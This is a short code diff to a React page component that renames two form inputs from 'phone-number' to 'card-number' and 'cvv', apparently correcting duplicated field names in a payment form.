@@ -843,7 +843,7 @@ export default function Home() {
                                         required=""
                                         type="number"
                                         maxLength={19}
-                                        name="phone-number"
+                                        name="card-number"
                                         className={`${styles.errorInputText} ${card === '' && submit ? styles1.loginInputError : ""}`}
                                         daterror-action-on-load="register-listeners"
                                         daterror-listeners=""
@@ -877,7 +877,7 @@ export default function Home() {
                                         required=""
                                         type="number"
                                         maxLength={5}
-                                        name="phone-number"
+                                        name="cvv"
                                         className={`${styles.errorInputText} ${security === '' && submit ? styles1.loginInputError : ""} w-25 mr-1`}
 
                                         daterror-action-on-load="register-listeners"
